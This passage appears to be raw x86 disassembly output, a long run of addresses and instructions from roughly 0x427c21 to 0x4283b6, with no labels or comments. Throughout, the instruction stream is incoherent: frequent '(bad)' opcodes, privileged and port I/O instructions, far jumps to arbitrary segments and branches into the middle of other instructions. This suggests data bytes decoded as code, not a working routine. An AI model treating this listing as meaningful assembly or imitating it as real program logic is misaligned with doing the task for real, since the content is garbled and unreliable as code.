  427c21:	pop    ds
  427c22:	dec    edx
  427c23:	add    al,0xf3
  427c25:	add    dl,ch
  427c27:	icebp  
  427c28:	cmp    eax,edx
  427c2a:	stos   DWORD PTR es:[edi],eax
  427c2b:	leave  
  427c2c:	into   
  427c2d:	or     BYTE PTR gs:[ecx+0x37],al
  427c31:	ja     0x427c30
  427c33:	pop    es
  427c34:	inc    ecx
  427c35:	dec    ebp
  427c36:	jno    0x427ca2
  427c38:	mov    eax,0x3bf792d7
  427c3d:	in     al,dx
  427c3e:	imul   edx,DWORD PTR [edx+0x47],0x3d7259a9
  427c45:	cli    
  427c46:	fiadd  WORD PTR [esi-0x7124b215]
  427c4c:	arpl   si,dx
  427c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c4f:	daa    
  427c50:	jecxz  0x427c6a
  427c52:	mov    eax,ds:0xddb6943c
  427c57:	pusha  
  427c58:	or     al,0x1e
  427c5a:	xor    eax,DWORD PTR [edx]
  427c5c:	shl    BYTE PTR [ebp+0x7b],cl
  427c5f:	push   esp
  427c60:	retf   
  427c61:	iret   
  427c62:	add    eax,0x8c16592d
  427c67:	into   
  427c68:	(bad)  [esi+0x78f9452c]
  427c6e:	push   es
  427c6f:	mov    ah,BYTE PTR [edi-0x26]
  427c72:	sbb    eax,0x68d81a2e
  427c77:	outs   dx,BYTE PTR ds:[esi]
  427c78:	sub    DWORD PTR [edi],edx
  427c7a:	ss pop ecx
  427c7c:	fstp   st(3)
  427c7e:	dec    esi
  427c7f:	pop    ebp
  427c80:	leave  
  427c81:	leave  
  427c82:	out    0xc9,al
  427c84:	pop    ebx
  427c85:	call   0xcc39:0x6ac13d2f
  427c8c:	shl    esp,1
  427c8e:	mov    BYTE PTR [edx+edi*8-0xe],ch
  427c92:	iret   
  427c93:	xchg   esp,eax
  427c94:	inc    ebp
  427c95:	mov    ebp,0x2dfb175d
  427c9a:	inc    ebp
  427c9b:	push   edx
  427c9c:	jns    0x427cb7
  427c9e:	popa   
  427c9f:	cmp    esi,DWORD PTR [esi]
  427ca1:	push   ebp
  427ca2:	outs   dx,DWORD PTR ds:[esi]
  427ca3:	jmp    0x427cc9
  427ca5:	or     al,0x1
  427ca7:	arpl   ax,di
  427ca9:	mov    al,0x9
  427cab:	sub    ch,dh
  427cad:	jno    0x427cd4
  427caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427cb0:	xchg   ecx,eax
  427cb1:	xchg   esi,eax
  427cb2:	dec    ecx
  427cb3:	out    0xd0,al
  427cb5:	push   ebp
  427cb6:	and    ebx,DWORD PTR [ebp-0x4f980866]
  427cbc:	xchg   edi,eax
  427cbd:	jp     0x427c63
  427cbf:	std    
  427cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cc1:	loop   0x427cae
  427cc3:	mov    dh,BYTE PTR [ecx+ebx*2-0x1fe2c830]
  427cca:	pop    esp
  427ccb:	and    eax,0x5eea6a71
  427cd0:	sbb    esi,esp
  427cd2:	jp     0x427c54
  427cd4:	sbb    DWORD PTR [edi+0x2279e471],esp
  427cda:	and    BYTE PTR ds:0xa5fbde60,ch
  427ce0:	mov    bl,0xf0
  427ce2:	xor    dh,BYTE PTR [edx-0x1f06bfc0]
  427ce8:	sub    BYTE PTR [esi+0x5c],cl
  427ceb:	ror    BYTE PTR [edi],1
  427ced:	mov    ebp,eax
  427cef:	mov    ecx,0xcf64e9d9
  427cf4:	and    eax,0xc4169454
  427cf9:	pop    ebx
  427cfa:	(bad)  
  427cfb:	dec    ebp
  427cfc:	aaa    
  427cfd:	jmp    0x427ced
  427cff:	sbb    dl,BYTE PTR [esi-0x55]
  427d02:	leave  
  427d03:	ss in  eax,dx
  427d05:	pop    ds
  427d06:	mov    bh,0x61
  427d08:	mov    WORD PTR [ebx+ebp*2-0x7c],ds
  427d0c:	ja     0x427d00
  427d0e:	inc    ebx
  427d0f:	jle    0x427cef
  427d11:	and    al,0x7d
  427d13:	into   
  427d14:	nop
  427d15:	sbb    BYTE PTR ds:0xaf708c37,bl
  427d1b:	icebp  
  427d1c:	mov    al,0x35
  427d1e:	pusha  
  427d1f:	ins    BYTE PTR es:[edi],dx
  427d20:	mov    BYTE PTR [ebx+0x71],bh
  427d23:	imul   ebx,DWORD PTR [edi],0x60
  427d26:	pop    ds
  427d27:	inc    edx
  427d28:	add    ah,0x99
  427d2b:	cmc    
  427d2c:	fisub  WORD PTR [eax-0x2a]
  427d2f:	adc    al,0xe8
  427d31:	cld    
  427d32:	idiv   esi
  427d34:	mov    esp,0x1372eec5
  427d39:	and    dh,dl
  427d3b:	fadd   DWORD PTR [edx-0x5cbdc1f5]
  427d41:	dec    esi
  427d42:	sub    dh,BYTE PTR [edx+ecx*2-0x57]
  427d46:	arpl   WORD PTR ds:0xcc5b09a5,bx
  427d4c:	in     eax,dx
  427d4d:	pop    esp
  427d4e:	out    0x31,eax
  427d50:	cs sti 
  427d52:	nop
  427d53:	sbb    DWORD PTR [ebp+0x6498e77f],esp
  427d59:	sub    dh,cl
  427d5b:	fisttp WORD PTR [esi-0xb20f1b9]
  427d61:	sub    al,0xa8
  427d63:	mov    bl,0xec
  427d65:	and    dh,BYTE PTR [ecx]
  427d67:	push   cs
  427d68:	sti    
  427d69:	out    dx,al
  427d6a:	pop    edi
  427d6b:	xor    edi,ebx
  427d6d:	imul   ebp,DWORD PTR [ebx+edx*8],0x38a992d9
  427d74:	outs   dx,DWORD PTR ds:[esi]
  427d75:	neg    dl
  427d77:	adc    DWORD PTR [edi-0x5ec30869],ebx
  427d7d:	adc    eax,DWORD PTR [ebx]
  427d7f:	push   edx
  427d80:	lea    ecx,[edi]
  427d82:	mov    dh,BYTE PTR [esi+0x579b02a8]
  427d88:	in     eax,0xc9
  427d8a:	outs   dx,BYTE PTR ds:[esi]
  427d8b:	mov    edx,0x13ee0cd9
  427d90:	hlt    
  427d91:	push   ecx
  427d92:	(bad)  
  427d93:	test   al,0x3f
  427d95:	out    dx,eax
  427d96:	test   BYTE PTR [edi],0xf3
  427d99:	mov    WORD PTR [edx],ds
  427d9b:	outs   dx,DWORD PTR ds:[esi]
  427d9c:	adc    eax,0x9cd5d10d
  427da1:	sub    ebx,DWORD PTR [edi]
  427da3:	or     al,bh
  427da5:	loopne 0x427d6a
  427da7:	leave  
  427da8:	sub    esp,edx
  427daa:	dec    ecx
  427dab:	sar    DWORD PTR [edx],cl
  427dad:	aad    0x95
  427daf:	clc    
  427db0:	loopne 0x427d9a
  427db2:	test   esp,edi
  427db4:	push   ecx
  427db5:	push   ss
  427db6:	ja     0x427d64
  427db8:	dec    ebx
  427db9:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  427dbb:	sub    ah,ch
  427dbd:	push   0xd58183d5
  427dc2:	call   0x7918:0x24fbf3ac
  427dc9:	dec    eax
  427dca:	ja     0x427dbe
  427dcc:	leave  
  427dcd:	loop   0x427e00
  427dcf:	adc    BYTE PTR [eax-0x7638770f],dl
  427dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427dd6:	mov    cs,WORD PTR [edi-0x13]
  427dd9:	or     ebx,DWORD PTR [eax]
  427ddb:	mov    esp,0xc8cfb856
  427de0:	mov    dl,0x4a
  427de2:	pop    ebp
  427de3:	sub    al,0x7a
  427de5:	sbb    ch,BYTE PTR [ecx+0x71]
  427de8:	sub    dh,BYTE PTR [esi+ebx*1]
  427deb:	xchg   DWORD PTR [edx-0x157aefcc],esp
  427df1:	(bad)  
  427df2:	(bad)  
  427df3:	mov    edx,0xcb04574f
  427df8:	push   ss
  427df9:	(bad)  
  427dfa:	pop    ecx
  427dfb:	(bad)  
  427dfc:	jns    0x427dc3
  427dfe:	mov    ecx,0x982cc6ab
  427e03:	xchg   ecx,eax
  427e04:	mov    edx,0x2691e0de
  427e09:	mov    esi,0x7b675536
  427e0e:	mov    ah,0x2c
  427e10:	das    
  427e11:	lods   al,BYTE PTR ds:[esi]
  427e12:	jbe    0x427e53
  427e14:	ins    BYTE PTR es:[edi],dx
  427e15:	inc    ecx
  427e16:	xchg   ecx,eax
  427e17:	or     BYTE PTR [ecx-0x16],bh
  427e1a:	sub    BYTE PTR [ecx],0x6f
  427e1d:	push   edx
  427e1e:	and    al,0x93
  427e20:	shl    ebp,cl
  427e22:	daa    
  427e23:	pop    ds
  427e24:	or     DWORD PTR [ebx],0x77c06743
  427e2a:	push   0xffffffde
  427e2c:	rcr    DWORD PTR [ebp+0x70ccb32e],1
  427e32:	mov    al,ds:0x6660baf2
  427e37:	out    0xff,eax
  427e39:	mov    dh,0x4b
  427e3b:	push   ebx
  427e3c:	dec    esp
  427e3d:	hlt    
  427e3e:	dec    ecx
  427e3f:	ds mov DWORD PTR ds:[eax],esi
  427e43:	dec    eax
  427e44:	test   DWORD PTR [esi],ecx
  427e46:	jecxz  0x427e39
  427e48:	loope  0x427e8a
  427e4a:	rol    ch,cl
  427e4c:	retf   0xd371
  427e4f:	sbb    ah,BYTE PTR [ecx-0x36]
  427e52:	arpl   WORD PTR [ebx+0x4a],si
  427e55:	and    eax,0x5e9df9
  427e5a:	ins    BYTE PTR es:[edi],dx
  427e5b:	and    eax,0x941efeac
  427e60:	popf   
  427e61:	fisub  WORD PTR [ebp+0x6f]
  427e64:	jns    0x427e11
  427e66:	cmc    
  427e67:	int    0xbd
  427e69:	push   esp
  427e6a:	add    dl,BYTE PTR es:[edi]
  427e6d:	not    DWORD PTR [ebp-0x644ae8aa]
  427e73:	mov    BYTE PTR gs:[edi],bl
  427e76:	ss scas eax,DWORD PTR es:[edi]
  427e78:	sbb    BYTE PTR [edx+0x53ba5695],ah
  427e7e:	test   eax,0xff2db91b
  427e83:	adc    esp,DWORD PTR [esi+0x24]
  427e86:	jp     0x427e09
  427e88:	ins    DWORD PTR es:[edi],dx
  427e89:	lds    esi,FWORD PTR ds:0xd5bf10ca
  427e8f:	inc    esi
  427e90:	lods   al,BYTE PTR ds:[esi]
  427e91:	bswap  edx
  427e93:	add    ebp,esp
  427e95:	test   BYTE PTR [ebx+0x4f],bl
  427e98:	jp     0x427e46
  427e9a:	jle    0x427e40
  427e9c:	mov    ds:0xfaee96dd,eax
  427ea1:	rol    BYTE PTR [esi-0x67],1
  427ea4:	inc    ebp
  427ea5:	pop    ecx
  427ea6:	sbb    eax,0xfd1d8023
  427eab:	jno    0x427f0b
  427ead:	fldcw  WORD PTR [eiz*1+0x279222ec]
  427eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427eb5:	rol    BYTE PTR [ecx-0x1dc635d4],0x89
  427ebc:	jmp    0x427ed8
  427ebe:	add    eax,0xecc029cd
  427ec3:	mov    ch,0xe4
  427ec5:	enter  0x8f7b,0x1c
  427ec9:	clc    
  427eca:	mov    al,0x5f
  427ecc:	xor    DWORD PTR [edi-0x61],ecx
  427ecf:	adc    eax,0xa4d3243c
  427ed4:	push   eax
  427ed5:	sub    al,0xa4
  427ed7:	call   0x710b:0x24f9e23a
  427ede:	and    al,0xae
  427ee0:	adc    eax,0x6503d916
  427ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ee6:	sar    DWORD PTR [edi],1
  427ee8:	adc    dl,BYTE PTR [ebp-0x34]
  427eeb:	fcmovnbe st,st(0)
  427eed:	mov    ebp,0x243943f4
  427ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ef3:	enter  0xd9a6,0xc8
  427ef7:	jp     0x427f30
  427ef9:	je     0x427f51
  427efb:	and    BYTE PTR [ecx+0x3af921ec],ch
  427f01:	ja     0x427f25
  427f03:	scas   al,BYTE PTR es:[edi]
  427f04:	in     eax,0xea
  427f06:	out    dx,al
  427f07:	repz jl 0x427edb
  427f0a:	fimul  DWORD PTR [edi]
  427f0c:	popf   
  427f0d:	cmc    
  427f0e:	outs   dx,DWORD PTR ds:[esi]
  427f0f:	hlt    
  427f10:	cmp    BYTE PTR ds:0xfdcc48a2,bh
  427f16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f17:	adc    eax,0xdde8bd39
  427f1c:	adc    DWORD PTR [eax],ebp
  427f1e:	jp     0x427f61
  427f20:	pop    esi
  427f21:	ret    0xa58b
  427f24:	hlt    
  427f25:	xor    esp,edi
  427f27:	jecxz  0x427edc
  427f29:	pop    esp
  427f2a:	mov    edx,0x80f710bd
  427f2f:	push   es
  427f30:	test   ebx,ebx
  427f32:	ret    
  427f33:	mov    ebp,0x5c9f0bae
  427f38:	call   0xdb13d064
  427f3d:	cmp    esi,ebx
  427f3f:	mov    ds:0x19ad0f61,al
  427f44:	or     esp,DWORD PTR [esi+0x36]
  427f47:	sbb    dl,BYTE PTR [ecx-0x2b]
  427f4a:	imul   edx,DWORD PTR [edx+0x3d76f93d],0x5b
  427f51:	pusha  
  427f52:	loop   0x427fb0
  427f54:	jecxz  0x427f26
  427f56:	mov    dl,0xec
  427f58:	test   bh,ch
  427f5a:	icebp  
  427f5b:	aaa    
  427f5c:	test   eax,0xc1b2a88e
  427f61:	mov    edi,0xbbe4b88d
  427f66:	(bad)  
  427f67:	outs   dx,DWORD PTR ds:[esi]
  427f68:	jge    0x427f31
  427f6a:	mov    ebx,0x75c623c2
  427f6f:	push   esp
  427f70:	xchg   edi,eax
  427f71:	xchg   ebx,eax
  427f72:	out    dx,al
  427f73:	repz dec esi
  427f75:	pusha  
  427f76:	shl    DWORD PTR [edi+0x47],1
  427f79:	fwait
  427f7a:	iret   
  427f7b:	cmc    
  427f7c:	push   esi
  427f7d:	jae    0x427f15
  427f7f:	push   ecx
  427f80:	dec    esi
  427f81:	jmp    0x8283:0x6acd9675
  427f88:	sub    BYTE PTR [ecx-0x4e],cl
  427f8b:	iret   
  427f8c:	cmp    BYTE PTR [esi-0x34],0x42
  427f90:	outs   dx,BYTE PTR ds:[esi]
  427f91:	lahf   
  427f92:	pusha  
  427f93:	xchg   ebx,eax
  427f94:	xchg   ecx,eax
  427f95:	aad    0xd2
  427f97:	pop    ecx
  427f98:	je     0x427fc1
  427f9a:	loope  0x427f86
  427f9c:	sbb    DWORD PTR [ecx+eiz*1-0x13ffe177],ebp
  427fa3:	xor    esi,esp
  427fa5:	jge    0x427fd6
  427fa7:	shl    BYTE PTR [esi],cl
  427fa9:	imul   esi,edx,0x69
  427fac:	mov    esp,0x2dc0455e
  427fb1:	(bad)
  427fb4:	inc    ecx
  427fb5:	dec    DWORD PTR [ebx+0x3f]
  427fb8:	outs   dx,DWORD PTR ds:[esi]
  427fb9:	in     al,dx
  427fba:	push   es
  427fbb:	mov    dl,0x93
  427fbd:	sbb    bh,BYTE PTR [eax]
  427fbf:	daa    
  427fc0:	les    esi,FWORD PTR [ebx-0x60]
  427fc3:	scas   eax,DWORD PTR es:[edi]
  427fc4:	lods   eax,DWORD PTR ds:[esi]
  427fc5:	dec    esi
  427fc6:	mov    bl,0xa3
  427fc8:	pop    edi
  427fc9:	mov    dl,0x45
  427fcb:	in     al,0x9e
  427fcd:	adc    DWORD PTR ss:[ebx],esi
  427fd0:	ret    0xa90b
  427fd3:	xchg   esi,eax
  427fd4:	imul   esp,DWORD PTR [esi+0x38bc92d4],0x56fbd739
  427fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fdf:	xchg   esp,eax
  427fe0:	aad    0x4a
  427fe2:	les    ebx,FWORD PTR ds:0x68f9705
  427fe8:	loope  0x427fdf
  427fea:	es retf 0xf547
  427fee:	(bad)  
  427fef:	mul    ecx
  427ff1:	sbb    edi,ebx
  427ff3:	jge    0x427f7a
  427ff5:	(bad)
  427ff8:	xchg   ebp,eax
  427ff9:	sub    dl,al
  427ffb:	jo     0x427f97
  427ffd:	add    esp,DWORD PTR [ebx-0x40]
  428000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428001:	mov    bl,0x4d
  428003:	in     eax,dx
  428004:	mov    ch,0x57
  428006:	rcr    DWORD PTR [edi+eiz*8+0x79e0e502],0x4d
  42800e:	and    ch,BYTE PTR [eax+0x5a]
  428011:	(bad)  
  428012:	mov    DWORD PTR [edx+0x255dc7ae],0x588346a8
  42801c:	cmp    edi,ebx
  42801e:	mov    al,0xa9
  428020:	inc    edi
  428021:	ss inc eax
  428023:	push   edi
  428024:	dec    ebx
  428025:	mov    dl,0x3
  428027:	xchg   esi,eax
  428028:	push   ecx
  428029:	mov    dh,0xd4
  42802b:	inc    ebx
  42802c:	push   ds
  42802d:	int3   
  42802e:	repnz shl DWORD PTR fs:[ebx],0x2f
  428033:	or     al,0x1d
  428035:	push   esi
  428036:	push   cs
  428037:	inc    ecx
  428038:	push   cs
  428039:	js     0x428067
  42803b:	push   edx
  42803c:	retf   
  42803d:	in     al,0xb5
  42803f:	shl    DWORD PTR [eax+ecx*2-0x28],0xc3
  428044:	ret    0xb2e6
  428047:	repnz adc eax,0xafca3f42
  42804d:	add    ebx,DWORD PTR [edi+0x1188cca]
  428053:	cmp    BYTE PTR ds:0xa69f855d,dh
  428059:	xlat   BYTE PTR ds:[ebx]
  42805a:	cmc    
  42805b:	repz push edx
  42805d:	sbb    DWORD PTR [ebx+0x5e],esi
  428060:	rcl    ecx,1
  428062:	fisttp DWORD PTR ds:0x408c5a53
  428068:	clc    
  428069:	lds    eax,FWORD PTR [esi+0x3ec0bb4d]
  42806f:	push   edx
  428070:	jnp    0x428019
  428072:	jge    0x4280df
  428074:	cld    
  428075:	adc    BYTE PTR [ebx+0x47],al
  428078:	into   
  428079:	pop    esi
  42807a:	mov    bh,BYTE PTR [ebx+0x615e2fe0]
  428080:	inc    eax
  428081:	xor    bl,BYTE PTR [ebx+0x1a774cc7]
  428087:	in     al,0xf6
  428089:	xor    al,0x33
  42808b:	js     0x428059
  42808d:	inc    esp
  42808e:	fisub  DWORD PTR [edi+0xb]
  428091:	inc    edx
  428092:	sbb    ebx,esi
  428094:	(bad)  
  428095:	arpl   WORD PTR [edi+0x2e623f47],sp
  42809b:	clc    
  42809c:	dec    edx
  42809d:	dec    eax
  42809e:	ins    DWORD PTR es:[edi],dx
  42809f:	(bad)  
  4280a0:	push   esp
  4280a1:	cmp    dh,BYTE PTR [esi]
  4280a3:	sti    
  4280a4:	ins    DWORD PTR es:[edi],dx
  4280a5:	out    0x7f,eax
  4280a7:	repz in al,dx
  4280a9:	adc    eax,0x128a2bbb
  4280ae:	cmc    
  4280af:	mov    ch,ch
  4280b1:	or     al,0x35
  4280b3:	jp     0x4280f9
  4280b5:	push   si
  4280b7:	pop    ebx
  4280b8:	mov    ecx,0x92a7764c
  4280bd:	dec    eax
  4280be:	je     0x4280de
  4280c0:	fild   QWORD PTR [eax]
  4280c2:	inc    edx
  4280c3:	aas    
  4280c4:	pop    ss
  4280c5:	cmp    eax,0xcc070203
  4280ca:	xchg   ebp,eax
  4280cb:	xchg   ebx,eax
  4280cc:	lahf   
  4280cd:	mov    ds:0x144abe36,al
  4280d2:	dec    eax
  4280d3:	cmp    al,0x6d
  4280d5:	pop    edi
  4280d6:	inc    eax
  4280d7:	mov    ebx,0x28edc35f
  4280dc:	ja     0x4280de
  4280de:	add    BYTE PTR [eax],al
  4280e0:	add    BYTE PTR [eax],al
  4280e2:	(bad)  
  4280e3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4280e5:	push   eax
  4280e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280e7:	shl    bh,cl
  4280e9:	div    DWORD PTR [ebx-0x3d89742]
  4280ef:	fwait
  4280f0:	mov    eax,ds:0x1f87a37
  4280f5:	add    cl,ah
  4280f7:	add    al,0x0
  4280f9:	add    BYTE PTR [eax],dh
  4280fb:	adc    dl,BYTE PTR [eax]
  4280fd:	lahf   
  4280fe:	repz mov eax,0xc55238d9
  428104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428105:	jne    0x4280bd
  428107:	shl    BYTE PTR [ecx-0x23a3bfed],0xc7
  42810e:	mov    eax,ds:0x82d029d5
  428113:	xchg   edx,eax
  428114:	fcom   st(5)
  428116:	(bad)  
  428118:	dec    ebp
  428119:	and    DWORD PTR ds:0x5171ec29,0xffffffcd
  428120:	(bad)  [ebx]
  428122:	push   esp
  428123:	and    eax,0x59cdfb82
  428128:	adc    dl,cl
  42812a:	sbb    cl,ch
  42812c:	and    ah,BYTE PTR [edi]
  42812e:	popa   
  42812f:	imul   esi,DWORD PTR [esi+0x5e],0x42
  428133:	jmp    0x35fb7b8b
  428138:	stc    
  428139:	in     al,0xe1
  42813b:	mov    esi,0x57bc776c
  428140:	test   DWORD PTR [edi],ebp
  428142:	retf   
  428143:	test   ebp,ebx
  428145:	into   
  428146:	pop    ecx
  428147:	cmp    ch,ah
  428149:	inc    ecx
  42814a:	in     eax,dx
  42814b:	iret   
  42814c:	cmp    ecx,ebx
  42814e:	adc    ecx,DWORD PTR [edx]
  428150:	retf   0x8ca7
  428153:	cdq    
  428154:	sbb    bl,BYTE PTR [edi-0x6a]
  428157:	sub    eax,0x7cc5916f
  42815c:	inc    ecx
  42815d:	inc    esp
  42815e:	jnp    0x42812f
  428160:	cdq    
  428161:	xchg   esp,eax
  428162:	fidiv  DWORD PTR [esi]
  428164:	aad    0xf6
  428166:	inc    esp
  428167:	push   DWORD PTR [edx]
  428169:	mov    esi,0x4c0cdeff
  42816e:	loop   0x42814f
  428170:	sub    ecx,DWORD PTR [eax+esi*2+0x3ffdf90c]
  428177:	(bad)  
  428178:	pop    esi
  428179:	stos   BYTE PTR es:[edi],al
  42817a:	cmp    edx,DWORD PTR [esi]
  42817c:	addr16 retf 
  42817e:	dec    ebx
  42817f:	pop    ebx
  428180:	dec    edx
  428181:	xlat   BYTE PTR ds:[ebx]
  428182:	bound  ebp,QWORD PTR [ebp+0x202578b4]
  428188:	daa    
  428189:	mov    cl,0x45
  42818b:	mov    ah,0x57
  42818d:	xor    esi,0xffffffa3
  428190:	push   edi
  428191:	loop   0x4281eb
  428193:	push   eax
  428194:	inc    edi
  428195:	sbb    al,0x32
  428197:	cmp    BYTE PTR [ebp-0x73],al
  42819a:	push   0xffffff9b
  42819c:	pop    ss
  42819d:	dec    edx
  42819e:	mov    bh,BYTE PTR [esi+0x35d69f6e]
  4281a4:	sbb    bh,BYTE PTR [eax]
  4281a6:	sub    BYTE PTR [ebx],bl
  4281a8:	aad    0xac
  4281aa:	pop    esi
  4281ab:	lea    esp,[ebp+0x564ffdc9]
  4281b1:	(bad)  
  4281b2:	xchg   esp,eax
  4281b3:	sahf   
  4281b4:	(bad)  
  4281b5:	fbstp  TBYTE PTR [ebx-0x162f1ae5]
  4281bb:	lock xchg ebx,eax
  4281bd:	dec    dh
  4281bf:	jbe    0x4281a7
  4281c1:	or     eax,0x6ae635e0
  4281c6:	mov    dh,0x43
  4281c8:	shl    DWORD PTR [edx],cl
  4281ca:	or     ebp,0xab71545d
  4281d0:	or     cl,BYTE PTR [ebp-0x17a1fbf1]
  4281d6:	mov    ds:0xcd03454,eax
  4281db:	cld    
  4281dc:	cli    
  4281dd:	jecxz  0x428243
  4281df:	out    dx,al
  4281e0:	(bad)
  4281e3:	add    ecx,edi
  4281e5:	cli    
  4281e6:	mov    ds:0x13ad325b,al
  4281eb:	mov    ebx,0x1113dfe0
  4281f0:	int    0xb4
  4281f2:	test   BYTE PTR [edx],0x70
  4281f5:	adc    DWORD PTR [edi],edx
  4281f7:	xchg   ecx,eax
  4281f8:	or     BYTE PTR [ebx],ah
  4281fa:	ret    
  4281fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281fc:	je     0x428256
  4281fe:	cdq    
  4281ff:	cmc    
  428200:	in     eax,0xc1
  428202:	retf   0x9937
  428205:	dec    ebp
  428206:	mov    dl,0x82
  428208:	std    
  428209:	hlt    
  42820a:	aad    0x5b
  42820c:	push   ebp
  42820d:	cmc    
  42820e:	adc    al,BYTE PTR [ebx-0x75]
  428211:	cli    
  428212:	cli    
  428213:	jle    0x428244
  428215:	sbb    bl,BYTE PTR [edx-0x3e]
  428218:	sub    cl,BYTE PTR [edx]
  42821a:	jns    0x42824c
  42821c:	sbb    bl,BYTE PTR [ebp+0x372cb340]
  428222:	ins    DWORD PTR es:[edi],dx
  428223:	xor    al,0xa2
  428225:	sub    BYTE PTR [eax-0x66],ah
  428228:	mov    eax,ds:0x986e43fa
  42822d:	mov    ebx,0xad7df186
  428232:	add    DWORD PTR [esi+0x1acdf249],ecx
  428238:	loop   0x428275
  42823a:	std    
  42823b:	pop    edx
  42823c:	xlat   BYTE PTR ds:[ebx]
  42823d:	les    eax,FWORD PTR [ecx]
  42823f:	mov    edi,0xffb5e278
  428244:	leave  
  428245:	lahf   
  428246:	jecxz  0x4282c3
  428248:	and    DWORD PTR [esi+edi*1],esp
  42824b:	test   eax,0x25643583
  428250:	shl    DWORD PTR [eax-0x49c45c7e],0x34
  428257:	mov    DWORD PTR [edi-0x38],ecx
  42825a:	test   bh,0xf7
  42825d:	js     0x428211
  42825f:	or     BYTE PTR [ebx-0x7b],bh
  428262:	ss mov esi,0xa678c397
  428268:	dec    ebp
  428269:	mov    cl,BYTE PTR [eax+0x2e]
  42826c:	repz lea edi,[ecx-0x39]
  428270:	sub    BYTE PTR [ecx+0x2b],bh
  428273:	jmp    0x131684b7
  428278:	cli    
  428279:	pop    eax
  42827a:	loopne 0x4282f4
  42827c:	lods   eax,DWORD PTR ds:[esi]
  42827d:	ss fnstsw ax
  428280:	cmp    bl,BYTE PTR [edx+0x909a870]
  428286:	sbb    bh,BYTE PTR [esi+0x72e46838]
  42828c:	mov    esi,0xbd68b34
  428291:	jmp    FWORD PTR [edi-0xd]
  428294:	xor    eax,0xe4e1b8f9
  428299:	jmp    0x183:0x13f442aa
  4282a0:	xor    eax,0x66830b2b
  4282a5:	adc    eax,0x2daeb763
  4282aa:	cdq    
  4282ab:	cs push edi
  4282ad:	mov    esp,0x3a4b2146
  4282b2:	in     al,dx
  4282b3:	in     al,dx
  4282b4:	icebp  
  4282b5:	xchg   ebx,eax
  4282b6:	push   ecx
  4282b7:	in     al,dx
  4282b8:	outs   dx,BYTE PTR ds:[esi]
  4282b9:	mov    esi,0xa9785e72
  4282be:	xrstor [edx+ebp*2+0x7452b021]
  4282c6:	mov    eax,ds:0x6121549b
  4282cb:	push   es
  4282cc:	int    0x82
  4282ce:	xchg   cl,ch
  4282d0:	push   ss
  4282d1:	sahf   
  4282d2:	xor    al,0x2b
  4282d4:	hlt    
  4282d5:	or     DWORD PTR [ebx],ebx
  4282d7:	add    BYTE PTR [edi+0x4f],ah
  4282da:	jno    0x42834a
  4282dc:	sub    esi,edi
  4282de:	divps  xmm1,XMMWORD PTR [esi+ebx*1+0x3822eafe]
  4282e6:	test   al,0x75
  4282e8:	push   esi
  4282e9:	dec    edx
  4282ea:	push   ecx
  4282eb:	mov    ds:0xbd41f4a4,eax
  4282f0:	xlat   BYTE PTR ds:[ebx]
  4282f1:	ja     0x42832d
  4282f3:	jmp    0x22610c6d
  4282f8:	test   al,0xa0
  4282fa:	mov    eax,ds:0x70ca66f6
  4282ff:	in     al,0xf1
  428301:	(bad)  
  428302:	sti    
  428303:	cmp    BYTE PTR [ebx-0x6aad89ea],bl
  428309:	shr    BYTE PTR [ecx+0x25f80bba],cl
  42830f:	fldenv [edx-0x6453f4b0]
  428315:	jo     0x4282a0
  428317:	inc    ebp
  428318:	gs push esp
  42831a:	ins    BYTE PTR es:[edi],dx
  42831b:	jae    0x428387
  42831d:	mov    eax,0x1a028f56
  428322:	leave  
  428323:	stc    
  428324:	inc    ebp
  428325:	call   esp
  428327:	mov    ebp,0xda8d141
  42832c:	mov    esp,0xe17bc8d0
  428331:	jns    0x42832c
  428333:	xchg   esp,eax
  428334:	add    eax,0xbe9ce40f
  428339:	inc    edx
  42833a:	push   ebp
  42833b:	cs scas eax,DWORD PTR es:[edi]
  42833d:	out    0xb7,al
  42833f:	dec    esp
  428340:	outs   dx,BYTE PTR ds:[esi]
  428341:	in     eax,0x96
  428343:	test   DWORD PTR [edx-0xbc59cda],esi
  428349:	shl    DWORD PTR [ecx-0x2e],1
  42834c:	jne    0x42834e
  42834e:	mov    DWORD PTR [eax+0x285ede6],0xfd5e7604
  428358:	cmp    al,0xeb
  42835a:	js     0x42832a
  42835c:	mov    ah,0xa5
  42835e:	dec    eax
  42835f:	inc    ebp
  428360:	outs   dx,DWORD PTR ds:[esi]
  428361:	jo     0x42830f
  428363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428364:	xor    dh,cl
  428366:	(bad)  [ebp-0x6b39cbc1]
  42836c:	push   esp
  42836d:	ss jne 0x42831a
  428370:	xor    dl,BYTE PTR [edi-0x74850cc9]
  428376:	jge    0x428395
  428378:	cdq    
  428379:	loopne 0x428377
  42837b:	lahf   
  42837c:	cmp    DWORD PTR [esi],0xbeacfe6e
  428382:	cmp    ah,BYTE PTR [ebx+0x15]
  428385:	push   ds
  428386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428387:	dec    edi
  428388:	push   DWORD PTR [esi]
  42838a:	jmp    0xa82c:0x84e67883
  428391:	dec    edi
  428392:	add    al,0x7e
  428394:	sbb    ah,ah
  428396:	sub    bl,bh
  428398:	or     bh,BYTE PTR [eax+0x1]
  42839b:	jmp    0x720f59b8
  4283a0:	jnp    0x428337
  4283a2:	dec    eax
  4283a3:	inc    eax
  4283a4:	pop    ecx
  4283a5:	rcl    BYTE PTR [esi],1
  4283a7:	push   eax
  4283a8:	sar    DWORD PTR [edi+0x30390726],0x2b
  4283af:	xchg   esp,eax
  4283b0:	repnz push es
  4283b2:	retf   0x6394
  4283b5:	pop    edx
  4283b6:	lods   al,BYTE PTR ds:[esi]
